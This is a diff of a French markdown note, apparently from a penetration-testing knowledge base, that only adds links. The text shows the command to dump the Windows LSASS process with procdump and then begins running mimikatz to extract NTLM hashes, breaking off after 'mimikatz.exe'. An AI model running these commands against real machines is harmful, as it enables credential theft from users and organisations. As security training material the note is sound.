@@ -1,10 +1,10 @@
-#### Faire un dump du process LSASS.exe via procdump (dans le cas d'une connexion RDP il est aussi possible d'effectuer le dump du process depuis le gestionnaire des tâches)
+#### Faire un dump du process [Lsass.exe](../../../Ressources/Windows/Lsass.exe.md) via procdump (dans le cas d'une connexion RDP il est aussi possible d'effectuer le dump du process depuis le gestionnaire des tâches)
 
 ```powershell
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-#### On lance ensuite mimiktaz afin de récupérer les hashs NTLM présents dans le dump de lsass.exe
+#### On lance ensuite mimiktaz afin de récupérer les hashs NTLM présents dans le dump de [Lsass.exe](../../../Ressources/Windows/Lsass.exe.md)
 
 ```powershell
 mimikatz.exe
